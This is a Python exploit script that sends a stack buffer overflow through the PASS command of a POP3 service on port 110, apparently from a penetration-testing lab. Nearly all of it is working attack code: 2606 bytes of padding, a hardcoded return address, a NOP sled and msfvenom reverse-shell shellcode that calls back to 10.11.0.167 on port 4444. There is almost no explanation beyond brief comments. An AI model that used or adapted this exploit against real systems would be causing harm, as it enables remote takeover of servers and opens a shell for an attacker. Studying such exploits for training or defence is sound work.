#!/usr/bin/python
import sys
import socket

# bad chars found - \x00\x0a\x0d
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0a\x0d"
overflow = (
	"\xba\xf6\x2f\xca\x82\xdb\xd5\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
	"\x52\x83\xc0\x04\x31\x50\x0e\x03\xa6\x21\x28\x77\xba\xd6\x2e"
	"\x78\x42\x27\x4f\xf0\xa7\x16\x4f\x66\xac\x09\x7f\xec\xe0\xa5"
	"\xf4\xa0\x10\x3d\x78\x6d\x17\xf6\x37\x4b\x16\x07\x6b\xaf\x39"
	"\x8b\x76\xfc\x99\xb2\xb8\xf1\xd8\xf3\xa5\xf8\x88\xac\xa2\xaf"
	"\x3c\xd8\xff\x73\xb7\x92\xee\xf3\x24\x62\x10\xd5\xfb\xf8\x4b"
	"\xf5\xfa\x2d\xe0\xbc\xe4\x32\xcd\x77\x9f\x81\xb9\x89\x49\xd8"
	"\x42\x25\xb4\xd4\xb0\x37\xf1\xd3\x2a\x42\x0b\x20\xd6\x55\xc8"
	"\x5a\x0c\xd3\xca\xfd\xc7\x43\x36\xff\x04\x15\xbd\xf3\xe1\x51"
	"\x99\x17\xf7\xb6\x92\x2c\x7c\x39\x74\xa5\xc6\x1e\x50\xed\x9d"
	"\x3f\xc1\x4b\x73\x3f\x11\x34\x2c\xe5\x5a\xd9\x39\x94\x01\xb6"
	"\x8e\x95\xb9\x46\x99\xae\xca\x74\x06\x05\x44\x35\xcf\x83\x93"
	"\x3a\xfa\x74\x0b\xc5\x05\x85\x02\x02\x51\xd5\x3c\xa3\xda\xbe"
	"\xbc\x4c\x0f\x10\xec\xe2\xe0\xd1\x5c\x43\x51\xba\xb6\x4c\x8e"
	"\xda\xb9\x86\xa7\x71\x40\x41\xc2\x8e\x4a\x36\xba\x92\x4a\x29"
	"\x67\x1a\xac\x23\x87\x4a\x67\xdc\x3e\xd7\xf3\x7d\xbe\xcd\x7e"
	"\xbd\x34\xe2\x7f\x70\xbd\x8f\x93\xe5\x4d\xda\xc9\xa0\x52\xf0"
	"\x65\x2e\xc0\x9f\x75\x39\xf9\x37\x22\x6e\xcf\x41\xa6\x82\x76"
	"\xf8\xd4\x5e\xee\xc3\x5c\x85\xd3\xca\x5d\x48\x6f\xe9\x4d\x94"
	"\x70\xb5\x39\x48\x27\x63\x97\x2e\x91\xc5\x41\xf9\x4e\x8c\x05"
	"\x7c\xbd\x0f\x53\x81\xe8\xf9\xbb\x30\x45\xbc\xc4\xfd\x01\x48"
	"\xbd\xe3\xb1\xb7\x14\xa0\xd2\x55\xbc\xdd\x7a\xc0\x55\x5c\xe7"
	"\xf3\x80\xa3\x1e\x70\x20\x5c\xe5\x68\x41\x59\xa1\x2e\xba\x13"
	"\xba\xda\xbc\x80\xbb\xce"
	)

# Return pointer found - 0x5f4a358f = \x8f\x35\x4a\x5f
# Include a few NOPs (30) between pointer and shellcode
shellcode = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 30 + overflow

# Connect to remote system on port 110 (POP3) and login as a test user with shellcode as password
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.11.23.92',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + shellcode + '\r\n')
	s.send('QUIT\r\n')
	s.close()

# Print if unable to connect to POP3
except:
	print "Error connecting to POP3 port."
	sys.exit()